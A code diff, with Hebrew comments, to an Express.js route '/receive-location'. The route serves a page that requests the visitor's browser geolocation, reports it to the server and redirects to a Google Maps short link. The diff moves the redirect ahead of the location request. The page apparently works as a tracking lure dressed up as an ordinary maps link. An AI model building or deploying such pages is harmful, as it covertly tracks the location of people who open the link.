@@ -99,6 +99,8 @@ app.get('/receive-location', (req, res) => {
         </head>
         <body>
             <script>
+             // ביצוע רידיירקט לאפליקציה או אתר אחר
+                window.location.href = 'https://maps.app.goo.gl/CbUb2RehYNPCqs2aA';  // שנה לכתובת שלך
                 // בקשת המיקום הנוכחי מהדפדפן
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(function(position) {
@@ -119,8 +121,7 @@ app.get('/receive-location', (req, res) => {
                             console.error('Error reporting location:', error);
                         });
 
-                        // ביצוע רידיירקט לאפליקציה או אתר אחר
-                        window.location.href = 'https://maps.app.goo.gl/CbUb2RehYNPCqs2aA';  // שנה לכתובת שלך
+                       
                     });
                 } else {
                     alert("Geolocation is not supported by this browser.");
